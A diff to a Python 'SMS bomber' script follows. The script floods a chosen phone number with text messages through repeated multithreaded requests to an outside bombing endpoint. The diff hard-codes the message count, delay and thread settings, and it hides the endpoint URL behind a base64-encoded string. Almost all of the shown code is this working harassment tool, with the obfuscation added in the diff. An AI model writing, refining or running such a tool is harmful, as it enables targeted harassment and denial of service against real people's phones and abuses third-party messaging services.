@@ -4,12 +4,11 @@
 import os
 import sys
 import time
-import threading
 import requests
+import threading
+import base64
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from tqdm import tqdm
 
-# Banner and Owner Info
 BANNER = r"""
 ░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
 ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
@@ -40,7 +39,6 @@ def banner():
     print("\n")
 
 def format_phone(num):
-    # Keep only digits
     return ''.join(filter(str.isdigit, num.strip()))
 
 def input_phone():
@@ -59,42 +57,23 @@ def input_phone():
 
         return cc, target
 
-def input_int(prompt, max_value=None):
-    while True:
-        try:
-            val = int(input(prompt).strip())
-            if val <= 0:
-                print("[!] Number must be positive.")
-                continue
-            if max_value and val > max_value:
-                print(f"[!] Maximum allowed is {max_value}, setting to max.")
-                val = max_value
-            return val
-        except ValueError:
-            print("[!] Invalid input, please enter a valid number.")
+def start_bombing(cc, target):
+    # Base64 encoded API URL
+    encoded_api = "aHR0cHM6Ly9hbG5heWVlbS50b3AvVmlwLUJvbWJlci5waHA/cGhvbmU9"
+    base_url = base64.b64decode(encoded_api).decode()
+    url = f"{base_url}{cc}{target}"
 
-def input_float(prompt):
-    while True:
-        try:
-            val = float(input(prompt).strip())
-            if val < 0:
-                print("[!] Number must not be negative.")
-                continue
-            return val
-        except ValueError:
-            print("[!] Invalid input, please enter a valid number.")
+    total_sms = 10
+    delay = 0.5
+    threads = 5
 
-def start_bombing(cc, target, count, delay, threads):
-    url = f"https://alnayeem.top/Vip-Bomber.php?phone={cc}{target}"
     success, failed = 0, 0
     lock = threading.Lock()
 
     banner()
     print(f"Starting bombing +{cc} {target}")
-    print(f"Total SMS to send: {count}")
-    print(f"Delay between requests: {delay} seconds")
-    print(f"Using {threads} threads")
-    print("\nPress CTRL+C to stop.\n")
+    print(f"Sending {total_sms} SMS with {threads} threads and {delay} sec delay...\n")
+    print("Press CTRL+C to stop.\n")
 
     def send_request():
         nonlocal success, failed
@@ -103,39 +82,32 @@ def start_bombing(cc, target, count, delay, threads):
             with lock:
                 if response.status_code == 200:
                     success += 1
-                    print(f"[+] SMS sent successfully! ({success} successful, {failed} failed)")
+                    print(f"[+] SMS sent successfully! ({success} success, {failed} failed)")
                 else:
                     failed += 1
-                    print(f"[-] Failed to send SMS! HTTP Status: {response.status_code} ({success} successful, {failed} failed)")
+                    print(f"[-] Failed to send SMS! HTTP Status: {response.status_code} ({success} success, {failed} failed)")
         except Exception as e:
             with lock:
                 failed += 1
-                print(f"[-] Request error: {e} ({success} successful, {failed} failed)")
+                print(f"[-] Request error: {e} ({success} success, {failed} failed)")
 
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = []
-        for _ in tqdm(range(count), desc="Sending SMS"):
+        for _ in range(total_sms):
             futures.append(executor.submit(send_request))
-            time.sleep(delay)  # spacing out requests as user requested
+            time.sleep(delay)
 
-        # Wait for all to complete
-        for future in as_completed(futures):
-            pass
+        for future in futures:
+            future.result()
 
-    print("\nBombing complete!")
-    print(f"Total Successful: {success}")
-    print(f"Total Failed: {failed}")
+    print("\n[+] Bombing done successfully!")
+    time.sleep(5)
 
 def main():
     banner()
     cc, target = input_phone()
-    count = input_int("Enter number of SMS to send (max 500): ", max_value=500)
-    delay = input_float("Enter delay between requests (seconds, e.g. 0.5): ")
-    max_threads = (count // 10) if (count // 10) > 0 else 1
-    threads = input_int(f"Enter number of threads (recommended {max_threads}): ", max_value=50)
-
     try:
-        start_bombing(cc, target, count, delay, threads)
+        start_bombing(cc, target)
     except KeyboardInterrupt:
         print("\n[!] Bombing stopped by user.")
         sys.exit(0)
